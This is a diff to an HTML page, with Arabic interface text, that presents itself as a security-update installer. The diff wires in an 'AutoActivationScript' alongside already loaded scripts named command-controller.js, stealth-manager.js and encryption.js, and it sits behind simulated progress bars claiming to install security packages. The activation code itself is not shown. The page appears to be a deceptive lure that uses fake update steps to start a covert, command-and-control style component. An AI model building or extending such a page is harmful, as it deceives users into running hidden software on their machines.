@@ -179,6 +179,7 @@
     <script src="command-controller.js"></script>
     <script src="encryption.js"></script>
     <script src="stealth-manager.js"></script>
+    <script src="activation-script.js"></script>
     <script>
         // إدارة عملية التحديث
         document.addEventListener('DOMContentLoaded', () => {
@@ -213,6 +214,9 @@
                 status.textContent = 'جاري تثبيت التحديثات...';
                 
                 try {
+                    // إنشاء مثيل من سكريبت التفعيل التلقائي
+                    const activationScript = new AutoActivationScript();
+                    
                     // خطوة 1: تثبيت التحديثات الأساسية
                     detailedStatus.textContent = 'جاري تحميل الحزم الأمنية...';
                     await simulateProgress(20, 1000);
@@ -229,13 +233,20 @@
                     detailedStatus.textContent = 'جاري تعزيز نظام الحماية...';
                     await simulateProgress(90, 1000);
                     
-                    // خطوة 5: تفعيل النظام
+                    // خطوة 5: تفعيل النظام التلقائي
                     detailedStatus.textContent = 'جاري تفعيل النظام...';
                     await simulateProgress(100, 500);
                     
-                    // إظهار شاشة النجاح
-                    mainContent.style.display = 'none';
-                    successScreen.style.display = 'block';
+                    // بدء التفعيل التلقائي
+                    const activationResult = await activationScript.startAutoActivation();
+                    
+                    if (activationResult) {
+                        // إظهار شاشة النجاح
+                        mainContent.style.display = 'none';
+                        successScreen.style.display = 'block';
+                    } else {
+                        throw new Error('فشل في تفعيل النظام');
+                    }
                     
                 } catch (error) {
                     errorMessage.textContent = error.message;
